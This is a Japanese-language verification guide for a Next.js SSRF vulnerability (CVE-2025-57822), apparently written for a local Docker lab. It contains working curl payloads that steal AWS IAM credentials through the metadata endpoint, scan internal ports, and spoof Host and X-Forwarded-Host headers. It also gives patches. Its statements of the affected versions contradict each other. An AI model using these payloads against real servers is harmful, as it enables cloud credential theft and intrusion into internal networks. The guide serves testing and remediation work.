# CVE-2025-57822: Next.js SSRF脆弱性の検証手順

## 概要

**CVE-2025-57822**は、Next.js 14.1.1以前のバージョンに存在するServer-Side Request Forgery (SSRF)脆弱性です。

### 脆弱性の詳細

- **CVE ID**: CVE-2025-57822
- **脆弱性タイプ**: Server-Side Request Forgery (SSRF)
- **CVSS スコア**: 6.5 (Medium)
- **影響を受けるバージョン**: Next.js < 14.2.32, < 15.4.7
- **修正バージョン**: Next.js 14.2.32, 15.4.7以降

### 脆弱性の原因

Next.jsのミドルウェアで`NextResponse.next()`に生のリクエストヘッダーを渡すと、攻撃者が`Location`ヘッダーを操作してサーバー側から任意のURLへリクエストを送信させることができます。

```typescript
// 脆弱なコード例
return NextResponse.next({
    headers: request.headers,  // ← 危険: 生のヘッダーをそのまま渡している
});
```

## 検証環境のセットアップ

### 前提条件

- Docker と Docker Compose がインストールされていること
- ポート3000が利用可能であること
- curlコマンドが使用可能であること

### 1. アプリケーションの起動とシードデータの投入

```bash
# リポジトリのルートディレクトリで実行
cd /Users/azkineri/Documents/Workspace/ssrfTest

# 本番モードでビルド＆起動（シードデータも自動投入）
docker compose down -v
docker compose up --build
```

> [!IMPORTANT]
> この脆弱性は本番ビルド(`output: "standalone"`)で動作するため、必ず`Dockerfile`（開発用の`Dockerfile.dev`ではなく）を使用してください。

シードデータの投入が完了すると、テスト用アカウントが作成されます:

```
============================================================
🔐 CVE VERIFICATION TEST ACCOUNTS
============================================================
Regular User Account:
  Email:    user@test.local
  Password: User123!
  Role:     Regular User (isAdmin: false)
============================================================
```

### 2. テストアカウントでログイン

1. ブラウザで http://localhost:3000 を開く
2. 以下のアカウントでログイン:
   - **Email**: `user@test.local`
   - **Password**: `User123!`
3. ダッシュボードにアクセスできることを確認

### 3. セッションCookieの取得

ブラウザの開発者ツールでセッションCookieを取得します:

**Chrome/Edge/Brave:**
1. `F12`で開発者ツールを開く
2. `Application` → `Cookies` → `http://localhost:3000`
3. `better-auth.session_token`の値をコピー

**Firefox:**
1. `F12`で開発者ツールを開く
2. `Storage` → `Cookies` → `http://localhost:3000`
3. `better-auth.session_token`の値をコピー

## 脆弱性の検証

### テスト1: Locationヘッダーを使ったSSRF

`user@test.local`でログイン後、セッションCookieを取得して以下のコマンドを実行:

```bash
# user@test.local のセッションCookieを使用
curl -v \
  -H "Location: http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: better-auth.session_token=<user-session-token>" \
  http://localhost:3000/
```

**期待される動作:**
- サーバーが`Location`ヘッダーのURLにリクエストを送信
- AWSメタデータエンドポイント（169.254.169.254）へのアクセスが試行される

### テスト2: 内部ネットワークへのアクセス

```bash
curl -v \
  -H "Location: http://localhost:8080/admin" \
  -H "Cookie: better-auth.session_token=<your-session-token>" \
  http://localhost:3000/
```

**期待される動作:**
- サーバーが内部ポート8080にアクセスを試行
- 通常は外部からアクセスできない内部サービスへのリクエストが可能

### テスト3: Hostヘッダーの操作

```bash
curl -v \
  -H "Host: evil.example.com" \
  -H "Cookie: better-auth.session_token=<your-session-token>" \
  http://localhost:3000/
```

**期待される動作:**
- サーバー側で処理される`Host`ヘッダーが改ざんされる
- パスワードリセットメールなどのリンク生成に影響を与える可能性

### テスト4: X-Forwarded-Hostヘッダーの悪用

```bash
curl -v \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Cookie: better-auth.session_token=<your-session-token>" \
  http://localhost:3000/
```

## 攻撃シナリオ

### シナリオ1: AWSメタデータの窃取

攻撃者がEC2インスタンス上で動作するNext.jsアプリケーションに対して、メタデータエンドポイントへのSSRFを実行し、IAMクレデンシャルを窃取する。

```bash
# IAMロール情報の取得
curl -H "Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
     -H "Cookie: better-auth.session_token=<token>" \
     http://localhost:3000/

# 一時的なAWSクレデンシャルの取得
curl -H "Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>" \
     -H "Cookie: better-auth.session_token=<token>" \
     http://localhost:3000/
```

### シナリオ2: 内部サービスのポートスキャン

```bash
# 内部ポートのスキャン
for port in 8080 8081 8082 9000 9090; do
  echo "Testing port $port..."
  curl -H "Location: http://localhost:$port/" \
       -H "Cookie: better-auth.session_token=<token>" \
       http://localhost:3000/
done
```

### シナリオ3: 内部APIへの不正アクセス

```bash
# 内部管理APIへのアクセス
curl -H "Location: http://internal-admin-api:3001/users" \
     -H "Cookie: better-auth.session_token=<token>" \
     http://localhost:3000/
```

## 脆弱性の影響

- ✅ 内部ネットワークリソースへのアクセス
- ✅ クラウドメタデータエンドポイントからの機密情報窃取
- ✅ 内部サービスの列挙とポートスキャン
- ✅ ネットワークセキュリティ制御のバイパス
- ✅ 認証が必要な内部APIへのアクセス

## 修正方法

### 方法1: Next.jsのアップグレード（推奨）

```bash
# package.jsonを更新
npm install next@14.2.32
# または
npm install next@15.4.7
```

### 方法2: ミドルウェアの修正

必要なヘッダーのみを明示的に選択して渡す:

```typescript
// 修正後の安全なコード
return NextResponse.next({
    request: {
        headers: new Headers({
            'cookie': request.headers.get('cookie') || '',
            // 必要なヘッダーのみを明示的に追加
        })
    }
});
```

### 方法3: リバースプロキシでのヘッダーフィルタリング

Nginx等のリバースプロキシで危険なヘッダーを除去:

```nginx
# Nginxの設定例
proxy_set_header Location "";
proxy_set_header X-Forwarded-Host $host;
```

## トラブルシューティング

### コンテナが起動しない

```bash
# ログを確認
docker compose logs

# コンテナを完全に削除して再ビルド
docker compose down -v
docker compose up --build
```

### SSRFが動作しない

- 本番モード(`Dockerfile`)で起動しているか確認
- `next.config.mjs`に`output: "standalone"`が設定されているか確認
- セッションCookieが有効か確認

### レスポンスが返ってこない

- `-v`オプションでverbose出力を確認
- タイムアウト設定を調整: `curl --max-time 30 ...`

## 参考情報

- **CVE詳細**: https://nvd.nist.gov/vuln/detail/CVE-2025-57822
- **Next.js Security Advisory**: https://github.com/vercel/next.js/security/advisories
- **CWE-918**: Server-Side Request Forgery (SSRF)
- **修正コミット**: Next.js GitHub repository

## 関連する脆弱性

このリポジトリでは、以下の脆弱性も検証できます:

- [CVE-2025-29927](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md): ミドルウェアバイパス脆弱性
